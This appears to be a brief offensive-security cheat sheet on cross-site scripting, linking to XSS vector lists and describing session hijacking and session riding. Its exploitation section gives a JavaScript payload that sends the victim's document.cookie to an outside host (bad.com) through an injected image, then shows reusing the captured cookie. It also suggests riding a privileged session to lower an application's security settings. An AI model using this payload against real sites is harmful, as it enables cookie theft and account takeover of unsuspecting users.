# XSS

## Discovery

### XSS Vectors

[HTLM Purifier - XSS Attacks](http://htmlpurifier.org/live/smoketests/xssAttacks.xml)
[Mario Heiderich - HTML5 Security Cheatsheet](http://heideri.ch/jso/#46)


## Exploitation

### Session Hijacking

Steal the authentication tokens or cookies.

```js
var img = document.createElement('img');
img.src = 'https://bad.com/?cookie=' + document.cookie;
document.body.appendChild(img);
```

Then use the stolen credentials to take-over the session or send requests on it's behalf.

```js
document.cookie='captured=cookie'
```

### Session Riding (CSRF)

Inject any JS that you want to run from within the user's session.  This alleviates the need for us to send/capture tokens.

If we can ride the session of a privileged user, we could:
* Lower the security settings of the application to make further attacks possible/easier